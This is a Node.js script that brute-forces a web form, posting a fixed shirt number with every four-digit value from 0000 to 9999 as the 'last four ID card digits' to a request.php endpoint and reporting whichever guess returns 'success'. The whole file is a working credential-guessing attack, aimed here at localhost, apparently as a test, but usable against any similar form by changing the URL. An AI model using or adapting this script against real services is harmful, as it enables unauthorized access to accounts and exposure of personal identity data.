const request = require('request');
const chalk = require('chalk');
const ansiEscapes = require('ansi-escapes');

var urlport = "80";
var url = `http://127.0.0.1:${urlport}/request.php`;

var startpoint = 0;
var endpoint = 9999;

var finisharray = [];

var finishshirtnumber;
var finishidcardnumber;

function correctinput(loopnum, limitloop, returnfunc) {
    var maxloop = (limitloop.toString()).length;
    var maxloopnum = (loopnum.toString()).length;
    if (maxloopnum < maxloop) {
        returnfunc("0".repeat(maxloop - maxloopnum) + loopnum.toString());
    } else {
        returnfunc(loopnum.toString());
    };
};

function CheckIsSuccess(response) {
    return response === "success";
};

for (var i = startpoint; i < (endpoint + 1); i++) {
    correctinput(i, endpoint, (loopnumreturn) => {
        var shirtnumber = "40628";
        var idcardnumber = loopnumreturn;
        if (i !== 0) {process.stdout.write(ansiEscapes.eraseLines(2))};
        console.log(`[${chalk.yellow("Log")}]: created request number ${idcardnumber}#`);
        request(url, {
            headers: {
                'content-type': 'application/x-www-form-urlencoded'
            },
            body: `shirt-number=${shirtnumber}&last-four-id-card-number=${idcardnumber}`,
            method: 'POST'
        }, (err, res, body) => {
            if (CheckIsSuccess(body)) {
                finishshirtnumber = shirtnumber;
                finishidcardnumber = idcardnumber;
                correctinput(Number(idcardnumber) - 1, endpoint, (loopnumreturnminus) => {
                    console.log(`[${chalk.red("Error")}]: request number ${loopnumreturnminus}#`);
                    console.log(`[${chalk.green("Found")}]: request number ${idcardnumber}#`);
                });
            } else {
                console.log(`[${chalk.red("Error")}]: request number ${idcardnumber}#`);
                if (i !== 0 && (Number(idcardnumber) !== endpoint)) {
                    process.stdout.write(ansiEscapes.eraseLines(2));
                };
            };
            finisharray.push(i);
        });
    });
};

var loope = setInterval(() => {
    if (finisharray.length >= (endpoint + 1)) {
        console.log(`[${chalk.green("Finding Completed")}]: shirtnumber ${finishshirtnumber}\n[${chalk.green("Finding Completed")}]: idcardnumber ${finishidcardnumber}`);
        clearInterval(loope);
    };
}, 10);